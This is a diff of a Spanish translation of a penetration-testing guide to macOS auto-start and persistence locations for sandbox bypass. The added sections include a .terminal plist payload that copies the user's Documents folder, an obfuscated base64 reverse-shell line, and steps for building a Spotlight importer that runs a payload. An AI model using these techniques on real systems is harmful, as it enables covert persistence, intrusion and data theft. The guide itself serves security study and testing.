@@ -43,7 +43,7 @@ Aquí puedes encontrar ubicaciones de inicio útiles para **bypass de sandbox** 
 * **`~/Library/LaunchDemons`**
 * **Disparador**: Volver a iniciar sesión
 
-#### Descripción y explotación
+#### Descripción y Explotación
 
 **`launchd`** es el **primer** **proceso** ejecutado por el kernel de OX S al iniciar y el último en finalizar al apagar. Siempre debe tener el **PID 1**. Este proceso **lee y ejecuta** las configuraciones indicadas en los **plists** de **ASEP** en:
 
@@ -143,7 +143,7 @@ Configurar la explotación indicada y cerrar sesión e iniciar sesión o incluso
 
 #### Descripción y explotación
 
-Todas las aplicaciones que se reabrirán se encuentran dentro del archivo plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`
+Todas las aplicaciones que se reabrirán están dentro del archivo plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`
 
 Para hacer que las aplicaciones reabiertas ejecuten tu propia aplicación, solo necesitas **agregar tu aplicación a la lista**.
 
@@ -165,11 +165,20 @@ Para **agregar una aplicación a esta lista** puedes usar:
 -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
 ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
 ```
-### Terminal
+### Preferencias de Terminal
+
+* Útil para evitar el sandbox: [✅](https://emojipedia.org/check-mark-button)
+
+#### Ubicación
+
+* **`~/Library/Preferences/com.apple.Terminal.plist`**
+* **Disparador**: Abrir Terminal
+
+#### Descripción y Explotación
 
 En **`~/Library/Preferences`** se almacenan las preferencias del usuario en las aplicaciones. Algunas de estas preferencias pueden contener una configuración para **ejecutar otras aplicaciones/scripts**.
 
-Por ejemplo, Terminal puede ejecutar un comando al inicio:
+Por ejemplo, Terminal puede ejecutar un comando al iniciar:
 
 <figure><img src="../.gitbook/assets/image (676).png" alt="" width="495"><figcaption></figcaption></figure>
 
@@ -204,6 +213,51 @@ Puedes agregar esto desde la línea de comandos con:
 ```
 {% endcode %}
 
+### Scripts de Terminal
+
+* Útil para evadir el sandbox: [✅](https://emojipedia.org/check-mark-button)
+
+#### Ubicación
+
+* **En cualquier lugar**
+* **Disparador**: Abrir Terminal
+
+#### Descripción y Explotación
+
+Si creas un script **`.terminal`** y lo abres, la aplicación **Terminal** se invocará automáticamente para ejecutar los comandos indicados en él. Si la aplicación Terminal tiene algunos privilegios especiales (como TCC), tu comando se ejecutará con esos privilegios especiales.
+
+Pruébalo con:
+```bash
+# Prepare the payload
+cat > /tmp/test.terminal << EOF
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+<key>CommandString</key>
+<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
+<key>ProfileCurrentVersion</key>
+<real>2.0600000000000001</real>
+<key>RunCommandAsShell</key>
+<false/>
+<key>name</key>
+<string>exploit</string>
+<key>type</key>
+<string>Window Settings</string>
+</dict>
+</plist>
+EOF
+
+# Trigger it
+open /tmp/test.terminal
+
+# Use something like the following for a reverse shell:
+<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
+```
+{% hint style="danger" %}
+Si la terminal tiene **Acceso completo al disco**, podrá completar esa acción (ten en cuenta que el comando ejecutado será visible en una ventana de terminal).
+{% endhint %}
+
 ### Plugins de audio
 
 Descripción: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
@@ -212,15 +266,15 @@ Descripción: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](htt
 #### Ubicación
 
 * **`/Library/Audio/Plug-Ins/HAL`**
-* Se requiere acceso de root
+* Se requieren permisos de root
 * **Disparador**: Reiniciar coreaudiod o la computadora
 * **`/Library/Audio/Plug-ins/Components`**
-* Se requiere acceso de root
+* Se requieren permisos de root
 * **Disparador**: Reiniciar coreaudiod o la computadora
 * **`~/Library/Audio/Plug-ins/Components`**
 * **Disparador**: Reiniciar coreaudiod o la computadora
 * **`/System/Library/Components`**
-* Se requiere acceso de root
+* Se requieren permisos de root
 * **Disparador**: Reiniciar coreaudiod o la computadora
 
 #### Descripción
@@ -238,8 +292,8 @@ Descripción: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevi
 * `/System/Library/QuickLook`
 * `/Library/QuickLook`
 * `~/Library/QuickLook`
-* `/Applications/AppNameHere/Contents/Library/QuickLook/`
-* `~/Applications/AppNameHere/Contents/Library/QuickLook/`
+* `/Applications/NombreDeLaAplicaciónAqui/Contents/Library/QuickLook/`
+* `~/Applications/NombreDeLaAplicaciónAqui/Contents/Library/QuickLook/`
 
 #### Descripción y explotación
 
@@ -521,7 +575,7 @@ Esto creará un archivo en 1 hora:
 ```bash
 echo "echo 11 > /tmp/at.txt" | at now+1
 ```
-Verifique la cola de trabajos usando `atq:`
+Comprueba la cola de trabajos utilizando `atq:`
 ```shell-session
 sh-3.2# atq
 26	Tue Apr 27 00:46:00 2021
@@ -947,15 +1001,100 @@ NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
 
 @end
 ```
-### Panel de preferencias
+### Complementos de Spotlight
+
+Útiles para evadir el sandbox: [🟠](https://emojipedia.org/large-orange-circle)
+
+* Pero terminarás en un sandbox de aplicación
+
+#### Ubicación
+
+* `~/Library/Spotlight/`
+* **Disparador**: Se crea un nuevo archivo con una extensión gestionada por el complemento de Spotlight.
+* `/Library/Spotlight/`
+* **Disparador**: Se crea un nuevo archivo con una extensión gestionada por el complemento de Spotlight.
+* Se requiere acceso de root
+* `/System/Library/Spotlight/`
+* **Disparador**: Se crea un nuevo archivo con una extensión gestionada por el complemento de Spotlight.
+* Se requiere acceso de root
+* `Some.app/Contents/Library/Spotlight/`
+* **Disparador**: Se crea un nuevo archivo con una extensión gestionada por el complemento de Spotlight.
+* Se requiere una nueva aplicación
+
+#### Descripción y explotación
+
+Spotlight es la función de búsqueda incorporada en macOS, diseñada para proporcionar a los usuarios acceso rápido y completo a los datos de sus computadoras.\
+Para facilitar esta capacidad de búsqueda rápida, Spotlight mantiene una base de datos propietaria y crea un índice analizando la mayoría de los archivos, lo que permite búsquedas rápidas tanto por nombres de archivo como por su contenido.
+
+El mecanismo subyacente de Spotlight involucra un proceso central llamado 'mds', que significa 'servidor de metadatos'. Este proceso orquesta todo el servicio de Spotlight. Además, existen múltiples demonios 'mdworker' que realizan diversas tareas de mantenimiento, como indexar diferentes tipos de archivos (`ps -ef | grep mdworker`). Estas tareas son posibles gracias a los complementos de importación de Spotlight, o "paquetes .mdimporter", que permiten que Spotlight comprenda e indexe contenido en una amplia gama de formatos de archivo.
+
+Los complementos o paquetes `.mdimporter` se encuentran en los lugares mencionados anteriormente y si aparece un nuevo paquete, se carga en cuestión de minutos (no es necesario reiniciar ningún servicio). Estos paquetes deben indicar qué tipo de archivo y extensiones pueden gestionar, de esta manera, Spotlight los utilizará cuando se cree un nuevo archivo con la extensión indicada.
+
+Es posible encontrar todos los `mdimporters` cargados ejecutando:
+```bash
+mdimport -L
+Paths: id(501) (
+"/System/Library/Spotlight/iWork.mdimporter",
+"/System/Library/Spotlight/iPhoto.mdimporter",
+"/System/Library/Spotlight/PDF.mdimporter",
+[...]
+```
+Y por ejemplo, **/Library/Spotlight/iBooksAuthor.mdimporter** se utiliza para analizar este tipo de archivos (extensiones `.iba` y `.book`, entre otros):
+```json
+plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist
+
+[...]
+"CFBundleDocumentTypes" => [
+0 => {
+"CFBundleTypeName" => "iBooks Author Book"
+"CFBundleTypeRole" => "MDImporter"
+"LSItemContentTypes" => [
+0 => "com.apple.ibooksauthor.book"
+1 => "com.apple.ibooksauthor.pkgbook"
+2 => "com.apple.ibooksauthor.template"
+3 => "com.apple.ibooksauthor.pkgtemplate"
+]
+"LSTypeIsPackage" => 0
+}
+]
+[...]
+=> {
+"UTTypeConformsTo" => [
+0 => "public.data"
+1 => "public.composite-content"
+]
+"UTTypeDescription" => "iBooks Author Book"
+"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
+"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
+"UTTypeTagSpecification" => {
+"public.filename-extension" => [
+0 => "iba"
+1 => "book"
+]
+}
+}
+[...]
+```
+{% hint style="danger" %}
+Si revisas el Plist de otros `mdimporter`, es posible que no encuentres la entrada **`UTTypeConformsTo`**. Esto se debe a que es un _Uniform Type Identifier_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) incorporado y no necesita especificar extensiones.
+
+Además, los complementos predeterminados del sistema siempre tienen prioridad, por lo que un atacante solo puede acceder a archivos que no estén indexados por los propios `mdimporters` de Apple.
+{% endhint %}
+
+Para crear tu propio importador, puedes comenzar con este proyecto: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) y luego cambiar el nombre, los **`CFBundleDocumentTypes`** y agregar **`UTImportedTypeDeclarations`** para que admita la extensión que deseas admitir y reflejarlos en **`schema.xml`**.\
+Luego **cambia** el código de la función **`GetMetadataForFile`** para ejecutar tu carga útil cuando se crea un archivo con la extensión procesada.
+
+Finalmente, **compila y copia tu nuevo `.mdimporter`** en una de las ubicaciones anteriores y puedes verificar cuándo se carga **monitoreando los registros** o verificando **`mdimport -L.`**
+
+### ~~Panel de preferencias~~
 
 {% hint style="danger" %}
-Parece que esto ya no funciona.
+No parece que esto funcione más.
 {% endhint %}
 
 Descripción: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)
 
-* Útil para evadir el sandbox: [🟠](https://emojipedia.org/large-orange-circle)
+* Útil para eludir el sandbox: [🟠](https://emojipedia.org/large-orange-circle)
 * Requiere una acción específica del usuario
 
 #### Ubicación
@@ -966,31 +1105,31 @@ Descripción: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevi
 
 #### Descripción
 
-Parece que esto ya no funciona.
+No parece que esto funcione más.
 
 ## Bypass de Sandbox de Root
 
 {% hint style="success" %}
-Aquí puedes encontrar ubicaciones de inicio útiles para **evadir el sandbox** que te permiten simplemente ejecutar algo al **escribirlo en un archivo** siendo **root** y/o requiriendo otras **condiciones extrañas**.
+Aquí puedes encontrar ubicaciones de inicio útiles para eludir el sandbox que te permite simplemente ejecutar algo al **escribirlo en un archivo** siendo **root** y/o requiriendo otras **condiciones extrañas**.
 {% endhint %}
 
 ### Periódico
 
 Descripción: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)
 
-* Útil para evadir el sandbox: [🟠](https://emojipedia.org/large-orange-circle)
+* Útil para eludir el sandbox: [🟠](https://emojipedia.org/large-orange-circle)
 * Pero necesitas ser root
 
 #### Ubicación
 
 * `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
-* Requiere ser root
+* Se requiere ser root
 * **Disparador**: Cuando llegue el momento
 * `/etc/daily.local`, `/etc/weekly.local` o `/etc/monthly.local`
-* Requiere ser root
+* Se requiere ser root
 * **Disparador**: Cuando llegue el momento
 
-#### Descripción y explotación
+#### Descripción y Explotación
 
 Los scripts periódicos (**`/etc/periodic`**) se ejecutan debido a los **launch daemons** configurados en `/System/Library/LaunchDaemons/com.apple.periodic*`. Ten en cuenta que los scripts almacenados en `/etc/periodic/` se **ejecutan** como el **propietario del archivo**, por lo que esto no funcionará para una posible escalada de privilegios.
 
